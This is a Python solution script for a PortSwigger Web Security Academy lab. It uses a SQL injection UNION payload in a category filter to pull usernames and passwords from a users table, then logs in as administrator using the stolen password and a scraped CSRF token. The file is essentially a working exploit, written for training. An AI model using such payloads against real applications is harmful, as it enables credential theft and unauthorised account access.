#https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
from utils import *

url="https://0ac2000803f52e0480903f0100d9006e.web-security-academy.net/"
payload="filter?category=' union select username,password from users --"
exploit=f"{url}{payload}"
response=requests.get(exploit)
soup=parse_html(response)
for row in soup.find_all('tr'):
    if row.find('th').text=="administrator":
        password=row.find('td').text

session=requests.Session()
token=parse_html(session.get(f"{url}login")).find('input')['value']

payload={
    "username":'administrator',
    "password":password,
    "csrf":token
}
soup=parse_html(session.post(f"{url}login",data=payload))
print(check_succes(soup))